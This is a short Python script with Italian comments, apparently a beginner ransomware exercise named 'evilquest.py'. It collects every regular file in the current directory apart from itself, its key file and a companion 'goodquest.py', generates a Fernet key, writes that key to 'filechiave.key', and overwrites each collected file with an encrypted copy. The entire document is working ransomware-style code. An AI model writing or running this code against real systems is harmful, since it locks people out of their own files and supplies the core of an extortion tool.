#!/usr/bin/python3
import os
from cryptography.fernet import Fernet

# cerhiamo i file

files = [] #creiamo una lista

for file in os.listdir():
    if file == "evilquest.py" or file == "filechiave.key" or file == "goodquest.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)
key = Fernet.generate_key()
print(key)
with open("filechiave.key", "wb") as filechiave:
    filechiave.write(key)
for file in files:
    with open(file, "rb") as ilfile:
        contenuto = ilfile.read()
    contenuto_criptato = Fernet(key).encrypt(contenuto)
    with open(file, "wb") as ilfile:
        ilfile.write(contenuto_criptato)
        